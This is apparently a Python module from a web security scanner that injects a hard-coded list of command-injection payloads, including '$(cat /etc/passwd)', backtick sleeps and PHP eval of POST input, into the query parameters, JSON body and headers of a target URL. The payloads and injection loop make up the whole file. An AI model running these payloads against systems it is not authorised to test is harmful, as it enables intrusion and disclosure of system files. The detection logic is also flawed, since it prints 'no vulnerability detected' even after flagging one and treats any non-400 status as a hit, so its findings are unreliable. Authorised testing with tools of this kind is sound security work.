import requests
from urllib.parse import urlencode, urlparse, parse_qsl

# Common RCE payloads
rce_payloads = [
    '$(sleep 10)',  # Unix-based
    '$(cat /etc/passwd)',  # Unix-based
    '`sleep 10`',  # Unix-based
    '`cat /etc/passwd`',  # Unix-based
    '${@eval($_POST[cmd])}',  # PHP
    '${@exec($_POST[cmd])}',  # PHP
    'os.system("sleep 10")',  # Python
    'subprocess.Popen("sleep 10", shell=True)',  # Python
]

def check_rce_vulnerability(method, url, headers, body_json=None):
    body_json = {} if body_json is None else body_json

    parsed_url = urlparse(url)
    query_params = dict(parse_qsl(parsed_url.query))
    # print(query_params)
    print("\n[-] Parameter RCE")
    for payload in rce_payloads:
        test_params = query_params.copy()
        for key in test_params.keys():
            test_params[key] = payload
            test_url = parsed_url._replace(query=urlencode(test_params)).geturl()
            # print(test_url)
            response = requests.request(method, test_url, headers=headers, json=body_json)
            if response.status_code != 400:
                print(f"[!] Potential RCE detected with payload {payload} in query parameters")
    else:
        # print(response.content)
        print(f"\033[92m[v] No Potential RCE vulnerability detected!\033[0m")    
    
    print("\n[-] Body RCE")
    # Check RCE in body (if applicable)
    if body_json:
        for payload in rce_payloads:
            rce_body = body_json.copy()
            for key in rce_body:
                rce_body[key] = payload  
            response = requests.request(method, url, headers=headers, json=rce_body)
            if response.elapsed.total_seconds() > 9:
                print(f"\033[91m[!] Potential RCE vulnerability detected with payload in body: {payload}\033[0m")
        else:
            # print(response.content)
            print(f"\033[92m[v] No Potential RCE vulnerability detected!\033[0m")
    else:
        print(f"\033[92m[v] No Potential RCE vulnerability detected!\033[0m")


    print("\n[-] Head RCE")
    # Check RCE in headers
    for payload in rce_payloads:
        rce_headers = headers.copy()
        for key in rce_headers:
            rce_headers[key] = payload
        response = requests.request(method, url, headers=rce_headers, json=body_json)
        if response.elapsed.total_seconds() > 9:
            print(f"\033[91m[!] Potential RCE vulnerability detected with payload in headers: {payload}\033[0m")
    else:
        # print(response.content)
        print(f"\033[92m[v] No Potential RCE vulnerability detected!\033[0m")    


    
